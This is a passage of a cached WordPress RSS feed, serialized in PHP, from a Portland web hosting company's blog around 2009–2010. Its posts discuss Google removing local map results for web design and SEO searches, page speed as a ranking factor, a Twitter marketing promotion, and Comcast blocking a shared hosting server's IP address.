+<p>Yes, it seems that by using the word &#8220;in&#8221;  &#8211; a word that has pretty much been accepted as an <a href="http://www.link-assistant.com/seo-stop-words.html" target="_blank">SEO stop word</a> &#8211; users will trigger these drastic result changes.</p>
+<p>Will it&#8217;s use just affect Google maps, or will having &#8220;in&#8221; in your title tags now factor higher in organic listings?</p>
+<p>Perhaps that too,  will be industry specific? sure would be nice to get a list of those industries? Unreal.</p>
+<p><strong>Is this Fair? </strong><br />
+They don&#8217;t need to be &#8220;fair&#8221;, or even reasonable!  Google can do whatever they want, and in this case, it sounds like they want just tell us &#8220;<a href="http://blumenthals.com/blog/2009/12/31/google-to-seos-designers-advertising-agents-you-are-off-the-map/" target="_blank">thanks and goodbye</a>&#8220;.</p>
+<p>If someone searches for &#8220;plumber Portland&#8221; or any one of hundreds of other products or services, they&#8217;re going to see local map results, but for <a href="http://www.pdxtc.com/web-hosting.php" target="_blank">Portland web hosting</a>, they&#8217;re not. That&#8217;s just the way it is.</p>
+<p>The fact that this could happen to any industry tomorrow is what&#8217;s the most frustrating, and does seem a bit unfair &#8211; not so much to us, the &#8220;evil industry&#8221;, but to the public, who rely on our interpretation and expertise?  What are we, as industry professionals supposed to tell clients?</p>
+<p>Over the past year, we&#8217;ve been seeing local businesses pretty much ignore the organics, in favor of local efforts, but maybe they should just put  &#8220;in&#8221;  before every city name in their title tags? <img src='http://www.pdxtc.com/wpblog/wp-includes/images/smilies/icon_wink.gif' alt=';)' class='wp-smiley' /> </p>
+<p><strong>I Think Google is Being Arrogant</strong><br />
+In 2007,  I was at the Search Engine Strategies Local conference in Los Angeles, and during a Q&amp;A, I asked John Hanke, the Director at Google Maps:  &#8220;Besides having an address near the center of the zip code, what factors determine ranking in local search?</p>
+<p>Rather than give me anything useful, he appeared almost shocked that I would ask such a thing, and he actually said he <em>&#8220;wasn&#8217;t there to give away  Google algorithm secrets&#8221;! </em>(Not even at SES?)</p>
+<p>I was stunned, and some members of the audience (who seemed to be mostly advertising executives and PPC managers) laughed at my stupid question.</p>
+<p>Today, there is a <a href="http://blumenthals.com/blog/2010/01/06/loci-2009-david-mihms-most-important-articles-in-local-last-year/" target="_blank">wealth of local search information</a> and <a href="http://www.seobook.com/local-seo-case-study" target="_blank">search knowledge</a> like you can&#8217;t believe. The entire industry is making Google gazilionaires,  and they want to treat us like this?</p>
+<p>Frankly, I think that <a href="http://blumenthals.com/blog/2010/01/04/google-maps-web-designers-salt-in-the-wounds/" target="_blank">Google is simply spitting in the face of the very industry</a> that helped build them up in the first place.</p>
+<p><strong>The Teaching Moment</strong><br />
+the word, &#8220;it&#8221;  &#8211; a word that most SEO&#8217;s have long treated as just an <a href="http://www.link-assistant.com/seo-stop-words.html" target="_blank">SEO stop word</a>, is now going to trigger these DRASTIC changes.</p>
+<p>However, This fact only applies to some industries, and that list is subject to change, although there IS no list you can see.</p>
+<p>Got it?</p>
+<p>Just like the weather here in Oregon, if you don&#8217;t like the way Google search works today,  just wait a while because you can bet it&#8217;s going to change again, and probably soon.</p>
+<p>Note &#8211; In complete irony, this Monday&#8217;s snail mail contained a window decal and a letter from Google maps stating that I was a &#8220;favorite place&#8221; -  which is now pretty much pointless!</p>
+<p><a href="http://www.pdxtc.com/wpblog/wp-content/uploads/no-longer-favorite.jpg"><img class="aligncenter size-full wp-image-1618" title="no-longer-favorite" src="http://www.pdxtc.com/wpblog/wp-content/uploads/no-longer-favorite.jpg" alt="" width="377" height="544" /></a></p>
+";}s:3:"wfw";a:1:{s:10:"commentrss";s:67:"http://www.pdxtc.com/wpblog/google/google-is-all-over-the-map/feed/";}s:5:"slash";a:1:{s:8:"comments";s:1:"2";}s:7:"summary";s:337:"Google is all over the map in the way it displays search results,  but it looks like  SEO, web-hosting, and web design are not!
+Well, technically they&#8217;re still  &#8220;on the map&#8221;  but the map is not showing up any more in Google searches.
+Yes, in case you missed the news,  Google local map results are not being shown [...]";s:12:"atom_content";s:9504:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fgoogle%2Fgoogle-is-all-over-the-map%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fgoogle%2Fgoogle-is-all-over-the-map%2F" height="61" width="51" /></a></div><p>Google is all over the map in the way it displays search results,  but it looks like  SEO, web-hosting, and web design are not!</p>
+<p>Well, technically they&#8217;re still  &#8220;on the map&#8221;  but the map is not showing up any more in Google searches.</p>
+<p>Yes, in case you missed the news,  Google local map results are not being shown any more for web designers, for search marketing firms,  or web hosting.</p>
+<p><strong>Why? </strong><br />
+It&#8217;s still unclear, and to my knowledge, there&#8217;s been no definitive explanation from Google.</p>
+<p>As a local webhost / search marketer / developer, I&#8217;d like to point out that this sort of&#8230; well&#8230;  sucks to be singled out, and to me it makes no sense.</p>
+<p><strong>A Little History for Beginners</strong><br />
+Google introduced local map results into the mix quite a while ago, and they&#8217;ve changed when and how they display several times.</p>
+<p>After PPC ads came along, searching for a local business showed like this -</p>
+<p><img class="aligncenter size-full wp-image-1617" title="nolocal" src="http://www.pdxtc.com/wpblog/wp-content/uploads/nolocal.jpg" alt="" width="360" height="285" /></p>
+<p>About two years ago, they started showing a map, and either one or three results, when someone did a search that included a geographic target.</p>
+<p><img class="aligncenter size-full wp-image-1604" title="3 pack results" src="http://www.pdxtc.com/wpblog/wp-content/uploads/3pack.jpg" alt="" width="360" height="288" /></p>
+<p>Then in January of 2008, <a href="http://www.pdxtc.com/wpblog/google/google-doubles-front-page-real-estate/" target="_blank">they dramatically tripled the front page real estate</a> to show TEN results,  although late last year they knocked that number back to just seven.</p>
+<p><img class="aligncenter size-full wp-image-1605" title="7 pack search" src="http://www.pdxtc.com/wpblog/wp-content/uploads/7pack.jpg" alt="" width="360" height="333" />(<a href="http://www.redcardinal.ie" target="_blank">photos source</a>)</p>
+<p>Obviously this had the effect of pushing the organic search results even further down the page,  below the PPC ads and below the map results, effectively making the number one organic spot appear in what is really the 14th position.</p>
+<p>The entire web marketing industry changed for local businesses, and a new niche was born, with a <a href="http://www.davidmihm.com/local-search-ranking-factors.shtml" target="_blank">different set of ranking factors</a> almost completely unrelated to typical SEO.</p>
+<p><strong>What&#8217;s Happening Now?</strong><br />
+Nearly two months ago, November 2009, they began to <a href="http://blumenthals.com/blog/2009/11/06/has-google-maps-fixed-the-onebox-problem/" target="_blank">make some more changes</a>, and then suddenly were not showing ANY map results for &#8220;web design&#8221; when a city name was included.</p>
+<p>This was followed quickly by Web hosting, and they have now removed the map results from all SEO, and Internet marketing services type phrases too! Huh.</p>
+<p>On December 14th Brian, a Google employee  <a href="http://www.google.com/support/forum/p/maps/thread?fid=19f4b0936485546a0004764ffd35db73&amp;hl=en" target="_blank">noted on another thread</a> -</p>
+<blockquote><p>&#8230;it looks like a lot of the recent search examples on this thread have to do with web design, SEO, and other services of that sort.</p>
+<p>It?s possible that instead of being related to the original issue, Google.com doesn?t bring up map results for these types of searches because the search term doesn?t show much local intent.</p></blockquote>
+<p>Oh really? There&#8217;s no local intent on a search for Portland web host?  Puh-lease.</p>
+<p>On December 31, a <a href="http://www.google.com/support/forum/p/maps/thread?tid=1f506c6b4fd31f70&amp;hl=en#all" target="_blank">Google employee caused quite a stir</a> when he said this:</p>
+<blockquote><p>Today, we?re intentionally showing less local results for web design / SEO queries. For example, [web design sacramento] doesn?t display local listings today.</p>
+<p>We believe this is an accurate representation of user intent. In some cases, we do show local listings, however (as NSNA/php-er noted) [web design in bellingham].</p>
+<p>I?m sure some of you feel we should be displaying local results for queries like [Web Design Vancouver]. I understand that concern, but based on our understanding of our users, we feel this is the right decision for now.</p></blockquote>
+<p><strong>But using &#8220;In&#8221; Counts? </strong><br />
+Before Joel from Google replied, someone pointed out that using the word &#8220;in&#8221; does trigger the maps, but Joel didn&#8217;t address that at all.</p>
+<p>Yes, it seems that by using the word &#8220;in&#8221;  &#8211; a word that has pretty much been accepted as an <a href="http://www.link-assistant.com/seo-stop-words.html" target="_blank">SEO stop word</a> &#8211; users will trigger these drastic result changes.</p>
+<p>Will it&#8217;s use just affect Google maps, or will having &#8220;in&#8221; in your title tags now factor higher in organic listings?</p>
+<p>Perhaps that too,  will be industry specific? sure would be nice to get a list of those industries? Unreal.</p>
+<p><strong>Is this Fair? </strong><br />
+They don&#8217;t need to be &#8220;fair&#8221;, or even reasonable!  Google can do whatever they want, and in this case, it sounds like they want just tell us &#8220;<a href="http://blumenthals.com/blog/2009/12/31/google-to-seos-designers-advertising-agents-you-are-off-the-map/" target="_blank">thanks and goodbye</a>&#8220;.</p>
+<p>If someone searches for &#8220;plumber Portland&#8221; or any one of hundreds of other products or services, they&#8217;re going to see local map results, but for <a href="http://www.pdxtc.com/web-hosting.php" target="_blank">Portland web hosting</a>, they&#8217;re not. That&#8217;s just the way it is.</p>
+<p>The fact that this could happen to any industry tomorrow is what&#8217;s the most frustrating, and does seem a bit unfair &#8211; not so much to us, the &#8220;evil industry&#8221;, but to the public, who rely on our interpretation and expertise?  What are we, as industry professionals supposed to tell clients?</p>
+<p>Over the past year, we&#8217;ve been seeing local businesses pretty much ignore the organics, in favor of local efforts, but maybe they should just put  &#8220;in&#8221;  before every city name in their title tags? <img src='http://www.pdxtc.com/wpblog/wp-includes/images/smilies/icon_wink.gif' alt=';)' class='wp-smiley' /> </p>
+<p><strong>I Think Google is Being Arrogant</strong><br />
+In 2007,  I was at the Search Engine Strategies Local conference in Los Angeles, and during a Q&amp;A, I asked John Hanke, the Director at Google Maps:  &#8220;Besides having an address near the center of the zip code, what factors determine ranking in local search?</p>
+<p>Rather than give me anything useful, he appeared almost shocked that I would ask such a thing, and he actually said he <em>&#8220;wasn&#8217;t there to give away  Google algorithm secrets&#8221;! </em>(Not even at SES?)</p>
+<p>I was stunned, and some members of the audience (who seemed to be mostly advertising executives and PPC managers) laughed at my stupid question.</p>
+<p>Today, there is a <a href="http://blumenthals.com/blog/2010/01/06/loci-2009-david-mihms-most-important-articles-in-local-last-year/" target="_blank">wealth of local search information</a> and <a href="http://www.seobook.com/local-seo-case-study" target="_blank">search knowledge</a> like you can&#8217;t believe. The entire industry is making Google gazilionaires,  and they want to treat us like this?</p>
+<p>Frankly, I think that <a href="http://blumenthals.com/blog/2010/01/04/google-maps-web-designers-salt-in-the-wounds/" target="_blank">Google is simply spitting in the face of the very industry</a> that helped build them up in the first place.</p>
+<p><strong>The Teaching Moment</strong><br />
+the word, &#8220;it&#8221;  &#8211; a word that most SEO&#8217;s have long treated as just an <a href="http://www.link-assistant.com/seo-stop-words.html" target="_blank">SEO stop word</a>, is now going to trigger these DRASTIC changes.</p>
+<p>However, This fact only applies to some industries, and that list is subject to change, although there IS no list you can see.</p>
+<p>Got it?</p>
+<p>Just like the weather here in Oregon, if you don&#8217;t like the way Google search works today,  just wait a while because you can bet it&#8217;s going to change again, and probably soon.</p>
+<p>Note &#8211; In complete irony, this Monday&#8217;s snail mail contained a window decal and a letter from Google maps stating that I was a &#8220;favorite place&#8221; -  which is now pretty much pointless!</p>
+<p><a href="http://www.pdxtc.com/wpblog/wp-content/uploads/no-longer-favorite.jpg"><img class="aligncenter size-full wp-image-1618" title="no-longer-favorite" src="http://www.pdxtc.com/wpblog/wp-content/uploads/no-longer-favorite.jpg" alt="" width="377" height="544" /></a></p>
+";s:14:"date_timestamp";i:1262784614;}i:4;a:14:{s:5:"title";s:32:"Google Shows Us How to Go Faster";s:4:"link";s:68:"http://www.pdxtc.com/wpblog/google/google-shows-us-how-to-go-faster/";s:8:"comments";s:77:"http://www.pdxtc.com/wpblog/google/google-shows-us-how-to-go-faster/#comments";s:7:"pubdate";s:31:"Tue, 29 Dec 2009 09:50:15 +0000";s:2:"dc";a:1:{s:7:"creator";s:5:"Scott";}s:8:"category";s:15:"Googlesitespeed";s:4:"guid";s:35:"http://www.pdxtc.com/wpblog/?p=1587";s:11:"description";s:342:"Before Google&#8217;s announcement that the speed at which your site loads for visitors &#8220;matters&#8221;, we&#8217;d all heard it said repeatedly that it did NOT matter for organic rankings, but that it may someday, and it seems that day arrived early last month. 
+When I rolled out the SEO Automatic review, I chose to include the [...]";s:7:"content";a:1:{s:7:"encoded";s:2845:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fgoogle%2Fgoogle-shows-us-how-to-go-faster%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fgoogle%2Fgoogle-shows-us-how-to-go-faster%2F" height="61" width="51" /></a></div><p>Before Google&#8217;s announcement that the speed at which your site loads for visitors &#8220;matters&#8221;, we&#8217;d all heard it said repeatedly that it did NOT matter for organic rankings, but that it may someday, and it seems that day arrived early last month. </p>
+<p>When I rolled out the <a href="http://www.seoautomatic.com/unique-tools/instant-seo-review/">SEO Automatic review</a>, I chose to include the checking of site compression, and showing file sizes, even though the collective wisdom of the SEO industry was that your page load time was only a factor for your Google Adwords Quality Score, and for the user experience, but it was not an organic ranking factor.  </p>
+<p>At Pubcon last month, in my web hosting presentation, I talked for the third year in a row about speeding up your website. My logic was that what&#8217;s good for visitors was good for the search engines, and nobody wanted to sit around and wait for a page to load. </p>
+<p>Near the end of my slides, I said I was predicting Google would make page speed a factor very soon, and the very next afternoon, the announcement was made by Matt Cutts that they now were. Am I a heretic? Hardly &#8211; others had been <a href="http://www.buzzstream.com/blog/page-load-speed-ranking-factor.html" target="_blank">saying </a> the <a href="http://www.semclubhouse.com/do-page-load-times-affect-your-search-rankings/"target="_blank">same thing</a> for a while already.</p>
+<p>So, now that speed &#8220;officially&#8221; matters, Google is further stressing the importance by adding info to Google Webmaster Tools, and here&#8217;s a 4 minute video I made showing you what they&#8217;ve done, and their Firefox tools as well. </p>
+<p><object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="480" height="385" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0"><param name="allowFullScreen" value="true" /><param name="allowscriptaccess" value="always" /><param name="src" value="http://www.youtube.com/v/BZbzZ1vv5F0&amp;hl=en_US&amp;fs=1&amp;rel=0&amp;color1=0x3a3a3a&amp;color2=0x999999" /><param name="allowfullscreen" value="true" /><embed type="application/x-shockwave-flash" width="480" height="385" src="http://www.youtube.com/v/BZbzZ1vv5F0&amp;hl=en_US&amp;fs=1&amp;rel=0&amp;color1=0x3a3a3a&amp;color2=0x999999" allowscriptaccess="always" allowfullscreen="true"></embed></object></p>
+";}s:3:"wfw";a:1:{s:10:"commentrss";s:73:"http://www.pdxtc.com/wpblog/google/google-shows-us-how-to-go-faster/feed/";}s:5:"slash";a:1:{s:8:"comments";s:1:"2";}s:7:"summary";s:342:"Before Google&#8217;s announcement that the speed at which your site loads for visitors &#8220;matters&#8221;, we&#8217;d all heard it said repeatedly that it did NOT matter for organic rankings, but that it may someday, and it seems that day arrived early last month. 
+When I rolled out the SEO Automatic review, I chose to include the [...]";s:12:"atom_content";s:2845:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fgoogle%2Fgoogle-shows-us-how-to-go-faster%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fgoogle%2Fgoogle-shows-us-how-to-go-faster%2F" height="61" width="51" /></a></div><p>Before Google&#8217;s announcement that the speed at which your site loads for visitors &#8220;matters&#8221;, we&#8217;d all heard it said repeatedly that it did NOT matter for organic rankings, but that it may someday, and it seems that day arrived early last month. </p>
+<p>When I rolled out the <a href="http://www.seoautomatic.com/unique-tools/instant-seo-review/">SEO Automatic review</a>, I chose to include the checking of site compression, and showing file sizes, even though the collective wisdom of the SEO industry was that your page load time was only a factor for your Google Adwords Quality Score, and for the user experience, but it was not an organic ranking factor.  </p>
+<p>At Pubcon last month, in my web hosting presentation, I talked for the third year in a row about speeding up your website. My logic was that what&#8217;s good for visitors was good for the search engines, and nobody wanted to sit around and wait for a page to load. </p>
+<p>Near the end of my slides, I said I was predicting Google would make page speed a factor very soon, and the very next afternoon, the announcement was made by Matt Cutts that they now were. Am I a heretic? Hardly &#8211; others had been <a href="http://www.buzzstream.com/blog/page-load-speed-ranking-factor.html" target="_blank">saying </a> the <a href="http://www.semclubhouse.com/do-page-load-times-affect-your-search-rankings/"target="_blank">same thing</a> for a while already.</p>
+<p>So, now that speed &#8220;officially&#8221; matters, Google is further stressing the importance by adding info to Google Webmaster Tools, and here&#8217;s a 4 minute video I made showing you what they&#8217;ve done, and their Firefox tools as well. </p>
+<p><object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="480" height="385" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0"><param name="allowFullScreen" value="true" /><param name="allowscriptaccess" value="always" /><param name="src" value="http://www.youtube.com/v/BZbzZ1vv5F0&amp;hl=en_US&amp;fs=1&amp;rel=0&amp;color1=0x3a3a3a&amp;color2=0x999999" /><param name="allowfullscreen" value="true" /><embed type="application/x-shockwave-flash" width="480" height="385" src="http://www.youtube.com/v/BZbzZ1vv5F0&amp;hl=en_US&amp;fs=1&amp;rel=0&amp;color1=0x3a3a3a&amp;color2=0x999999" allowscriptaccess="always" allowfullscreen="true"></embed></object></p>
+";s:14:"date_timestamp";i:1262080215;}i:5;a:14:{s:5:"title";s:28:"Twitter Marketing Done Right";s:4:"link";s:75:"http://www.pdxtc.com/wpblog/social-networking/twitter-marketing-done-right/";s:8:"comments";s:84:"http://www.pdxtc.com/wpblog/social-networking/twitter-marketing-done-right/#comments";s:7:"pubdate";s:31:"Mon, 28 Dec 2009 14:33:34 +0000";s:2:"dc";a:1:{s:7:"creator";s:5:"Scott";}s:8:"category";s:24:"Social Networkingtwitter";s:4:"guid";s:35:"http://www.pdxtc.com/wpblog/?p=1578";s:11:"description";s:329:"I&#8217;ve frequently been asked if I can point to a good example of twitter marketing and I saw one first hand this weekend.
+Sunday afternoon, I happened to notice that Gary Vaynerchuck twittered that he would offer free shipping for the entire year of 2010, if the New Your Jets were to beat the Indianapolis Colts!
+
+
+Fat [...]";s:7:"content";a:1:{s:7:"encoded";s:3119:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fsocial-networking%2Ftwitter-marketing-done-right%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fsocial-networking%2Ftwitter-marketing-done-right%2F" height="61" width="51" /></a></div><p style="text-align: left;">I&#8217;ve frequently been asked if I can point to a good example of twitter marketing and I saw one first hand this weekend.</p>
+<p style="text-align: left;">Sunday afternoon, I happened to notice that <a href="http://twitter.com/garyvee" target="_blank">Gary Vaynerchuck twittered</a> that he would offer free shipping for the entire year of 2010, if the New Your Jets were to beat the Indianapolis Colts!</p>
+<p style="text-align: center;">
+<img class="aligncenter size-full wp-image-1579" title="twitter-garyv1" src="http://www.pdxtc.com/wpblog/wp-content/uploads/twitter-garyv1.jpg" alt="" width="388" height="228" /></p>
+<p>Fat chance of that happening, I figured, but I still thought it was a cool gamble, so I retweeted what Gary said.</p>
+<p style="text-align: center;"><img class="aligncenter size-full wp-image-1580" title="twitter-garyv2" src="http://www.pdxtc.com/wpblog/wp-content/uploads/twitter-garyv2.jpg" alt="" width="390" height="208" /></p>
+<p style="text-align: left;">
+<p style="text-align: left;">Then, in the second half of the football game, <a href="http://espn.go.com/nfl/recap?gameId=291227011" target="_blank">the Colts laid down for the Jets</a> by removing their starters,  and the Jets did actually beat the Colts by a score of 29 to 15.  Was this some sort of payoff by a competitor of <a href="http://www.gourmetlibrary.com/" target="_blank">Gourmet Library</a>? <img src='http://www.pdxtc.com/wpblog/wp-includes/images/smilies/icon_wink.gif' alt=';)' class='wp-smiley' /> </p>
+<p>Anyway, I sort of forgot about it, until just now as I was looking at the Twitter stream, and I happened to see this:</p>
+<p style="text-align: left;">
+<p style="text-align: center;"><img class="aligncenter size-full wp-image-1581" title="twitter-garyv3" src="http://www.pdxtc.com/wpblog/wp-content/uploads/twitter-garyv3.jpg" alt="" width="412" height="231" /></p>
+<p style="text-align: left;">So following the link in that Tweet,  I came to this -</p>
+<p style="text-align: center;"><img class="aligncenter size-full wp-image-1582" title="twitter-garyv4" src="http://www.pdxtc.com/wpblog/wp-content/uploads/twitter-garyv4.jpg" alt="" width="388" height="230" /></p>
+<p>So, I just got done sending an email off,  requesting my free shipping code for the entire year, and i&#8217;m going to go browse the catalog&#8230;</p>
+<p>It will  be interesting to hear how many free shipping codes get given away, as well as to know (a year from now) how much in free shipping was given away, how many dollars, and how many new customers were brought in by <a href="http://twitter.com/garyvee/status/7098512081" target="_blank">this single Tweet</a>.</p>
+";}s:3:"wfw";a:1:{s:10:"commentrss";s:80:"http://www.pdxtc.com/wpblog/social-networking/twitter-marketing-done-right/feed/";}s:5:"slash";a:1:{s:8:"comments";s:1:"3";}s:7:"summary";s:329:"I&#8217;ve frequently been asked if I can point to a good example of twitter marketing and I saw one first hand this weekend.
+Sunday afternoon, I happened to notice that Gary Vaynerchuck twittered that he would offer free shipping for the entire year of 2010, if the New Your Jets were to beat the Indianapolis Colts!
+
+
+Fat [...]";s:12:"atom_content";s:3119:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fsocial-networking%2Ftwitter-marketing-done-right%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fsocial-networking%2Ftwitter-marketing-done-right%2F" height="61" width="51" /></a></div><p style="text-align: left;">I&#8217;ve frequently been asked if I can point to a good example of twitter marketing and I saw one first hand this weekend.</p>
+<p style="text-align: left;">Sunday afternoon, I happened to notice that <a href="http://twitter.com/garyvee" target="_blank">Gary Vaynerchuck twittered</a> that he would offer free shipping for the entire year of 2010, if the New Your Jets were to beat the Indianapolis Colts!</p>
+<p style="text-align: center;">
+<img class="aligncenter size-full wp-image-1579" title="twitter-garyv1" src="http://www.pdxtc.com/wpblog/wp-content/uploads/twitter-garyv1.jpg" alt="" width="388" height="228" /></p>
+<p>Fat chance of that happening, I figured, but I still thought it was a cool gamble, so I retweeted what Gary said.</p>
+<p style="text-align: center;"><img class="aligncenter size-full wp-image-1580" title="twitter-garyv2" src="http://www.pdxtc.com/wpblog/wp-content/uploads/twitter-garyv2.jpg" alt="" width="390" height="208" /></p>
+<p style="text-align: left;">
+<p style="text-align: left;">Then, in the second half of the football game, <a href="http://espn.go.com/nfl/recap?gameId=291227011" target="_blank">the Colts laid down for the Jets</a> by removing their starters,  and the Jets did actually beat the Colts by a score of 29 to 15.  Was this some sort of payoff by a competitor of <a href="http://www.gourmetlibrary.com/" target="_blank">Gourmet Library</a>? <img src='http://www.pdxtc.com/wpblog/wp-includes/images/smilies/icon_wink.gif' alt=';)' class='wp-smiley' /> </p>
+<p>Anyway, I sort of forgot about it, until just now as I was looking at the Twitter stream, and I happened to see this:</p>
+<p style="text-align: left;">
+<p style="text-align: center;"><img class="aligncenter size-full wp-image-1581" title="twitter-garyv3" src="http://www.pdxtc.com/wpblog/wp-content/uploads/twitter-garyv3.jpg" alt="" width="412" height="231" /></p>
+<p style="text-align: left;">So following the link in that Tweet,  I came to this -</p>
+<p style="text-align: center;"><img class="aligncenter size-full wp-image-1582" title="twitter-garyv4" src="http://www.pdxtc.com/wpblog/wp-content/uploads/twitter-garyv4.jpg" alt="" width="388" height="230" /></p>
+<p>So, I just got done sending an email off,  requesting my free shipping code for the entire year, and i&#8217;m going to go browse the catalog&#8230;</p>
+<p>It will  be interesting to hear how many free shipping codes get given away, as well as to know (a year from now) how much in free shipping was given away, how many dollars, and how many new customers were brought in by <a href="http://twitter.com/garyvee/status/7098512081" target="_blank">this single Tweet</a>.</p>
+";s:14:"date_timestamp";i:1262010814;}i:6;a:14:{s:5:"title";s:29:"Comcast Blocking Web Servers?";s:4:"link";s:77:"http://www.pdxtc.com/wpblog/technology-articles/comcast-blocking-web-servers/";s:8:"comments";s:86:"http://www.pdxtc.com/wpblog/technology-articles/comcast-blocking-web-servers/#comments";s:7:"pubdate";s:31:"Wed, 23 Dec 2009 04:49:20 +0000";s:2:"dc";a:1:{s:7:"creator";s:5:"Scott";}s:8:"category";s:61:"Technology NewscomcastIPblockingmalicioussiteweb server block";s:4:"guid";s:35:"http://www.pdxtc.com/wpblog/?p=1565";s:11:"description";s:318:"Yesterday afternoon PDXTC had a report that a website we were hosting was down, but the server administrators said that it was up.
+An hour later, we had a second report of another website down, and the admins claimed it was up as well, and that&#8217;s where I got involved.
+I was working from home, and checking [...]";s:7:"content";a:1:{s:7:"encoded";s:5273:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Ftechnology-articles%2Fcomcast-blocking-web-servers%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Ftechnology-articles%2Fcomcast-blocking-web-servers%2F" height="61" width="51" /></a></div><p>Yesterday afternoon PDXTC had a report that a website we were hosting was down, but the server administrators said that it was up.</p>
+<p>An hour later, we had a second report of another website down, and the admins claimed it was up as well, and that&#8217;s where I got involved.</p>
+<p>I was working from home, and checking both websites came up blank &#8211; page not found &#8211; through my Comcast internet connection.</p>
+<p>I looked up the users  FTP information, and I was unable to login top either account using FTP either, simply getting an &#8220;unable to connect&#8221; message.</p>
+<p>One common connection between the two domains was that they happened to be on the same server, but other than that there was no reason why I shouldn&#8217;t be able to see these domains.</p>
+<p>I went to a <a href="http://www.Hidemyass.com" target="_blank">free proxy service</a> and from there I was able to see both domains and verify that they were indeed up and running, so clearly this was a Comcast issue.</p>
+<p>Was Comcast actually blocking my access to the web server? Had someone on this shared hosting server done something nefarious, and now Comcast was preventing me from accessing it through their servers?</p>
+<p>I phoned Comcast, and of course had to sift through their ridiculous voicemail system, finally arriving at the tier 1 tech support where I had to fight my way past his insistence upon rebooting my router and checking my computer settings.</p>
+<p>Finally after getting the guy to understand that the problem belonged to Comcast,  he transferred me to the &#8220;abuse&#8221; section, where he claimed they must be &#8220;blocking those websites&#8221;.</p>
+<p>Blocking those websites?!? &#8211; I&#8217;d never heard of that before!</p>
+<p>I waited my turn in the queue with Abuse department, and when the guy answered, he listened patiently, verified what I said was true,  and then had me run a trace route and email him the results.</p>
+<p>As you can see, I didn&#8217;t get very far -</p>
+<p style="text-align: center;"><a href="http://www.pdxtc.com/wpblog/wp-content/uploads/tracert.jpg" target="_blank"><img class="size-medium wp-image-1566  aligncenter" title="tracert" src="http://www.pdxtc.com/wpblog/wp-content/uploads/tracert-300x245.jpg" alt="" /></a></p>
+<p>By that point it was after seven o&#8217;clock at night, and he told me he would have to escalate it to his next support level but that I shouldn&#8217;t expect it to be &#8220;fixed&#8221;until some time the next day.</p>
+<p>At this point I asked if Comcast could be intentionally blocking my server IP address, and he assured me that no,   Comcast does not block access to web servers in the same way that they <a href="http://www.pdxtc.com/wpblog/technology-articles/cant-send-mail-using-comcast/" target="_self">block mail servers and ports</a>.</p>
+<p>Under certain circumstances he says, where a website is known to be distributing Malware or viruses, they may issue a warning before the users arrival that &#8220;the site may be harmful&#8230;&#8221; , but they do not,<strong> as far as he knows,</strong> intentionally block access to a Web server.  As far as he knows&#8230; Huh.</p>
+<p>Well, this morning, the sites are back up and I may never know what went wrong, so I guess I&#8217;ll just move on.</p>
+<p><strong>*** Update ***</strong></p>
+<p>I got a phone call back from comcast to tell me that all was resolved, and as it turns out,  <strong>Comcast HAD intentionally blocked all activity from that web server IP address</strong>!</p>
+<p>Interestingly, sites hosted on that same web server that had been assigned a static IP address continud to work fine, but the shared hosting domains were all blocked, with no warning message to the user, and FTP, Trace Route, and even pings to the IP were blocked entirely.</p>
+<p>The Comcast rep read me the notes he had gotten from engineering, and they sais that the IP was blocked because &#8220;Malicious data flows were detected over TCP port 80&#8243;.</p>
+<p>That&#8217;s it &#8211; no indication of what domain caused it, nor, was there any reason given WHY they would UNblock it at my request, since presumably the malicious activity is still going on from whatever domain was causing the problem. Bizarre.</p>
+<p>This was news to me, and news to the guy in security, who said he&#8217;s never heard of them blocking IP addresses like this before.</p>
+<p>So, is the moral of the story that a shared hosting account may be risky to your visibility? It looks that way, doesn&#8217;t it?</p>
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+<input id="gwProxy" type="hidden" />
+<input id="jsProxy" onclick="jsCall();" type="hidden" />
+";}s:3:"wfw";a:1:{s:10:"commentrss";s:82:"http://www.pdxtc.com/wpblog/technology-articles/comcast-blocking-web-servers/feed/";}s:5:"slash";a:1:{s:8:"comments";s:1:"6";}s:7:"summary";s:318:"Yesterday afternoon PDXTC had a report that a website we were hosting was down, but the server administrators said that it was up.
+An hour later, we had a second report of another website down, and the admins claimed it was up as well, and that&#8217;s where I got involved.
